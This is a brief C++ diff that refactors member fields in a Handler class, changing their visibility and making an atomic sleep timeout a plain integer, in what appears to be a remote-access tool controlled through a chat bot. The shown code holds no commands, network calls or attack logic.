@@ -21,9 +21,10 @@ using Bot_uPtr = std::unique_ptr<::rat::tbot::Bot>;
 using CurlClient_uPtr = std::unique_ptr<::rat::networking::Client>;
 
 class Handler {
-public:
-    std::atomic<uint32_t> sleep_timeout_ms{500};
+protected:
+    uint32_t sleep_timeout_ms = 500;
     uint32_t empty_updates_count = 0;
+public:
     uint64_t master_id;
     Bot_uPtr bot;
     BaseBot_uPtr backing_bot;
